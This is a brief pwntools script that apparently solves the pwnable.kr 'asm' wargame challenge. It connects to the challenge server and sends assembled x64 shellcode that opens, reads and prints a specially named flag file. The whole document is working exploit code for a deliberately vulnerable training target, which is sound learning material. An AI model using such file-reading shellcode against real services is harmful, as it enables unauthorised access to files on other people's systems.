from pwn import *

context(arch="amd64")

r = remote("pwnable.kr", 9026)

flag_filename = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

shellcode = shellcraft.open(flag_filename)
shellcode += shellcraft.read("rax", 0x41414F00, 0x100)
shellcode += shellcraft.write(1, 0x41414F00, 0x100)
shellcode = asm(shellcode)

r.sendafter(b"give me your x64 shellcode: ", shellcode)

r.interactive()
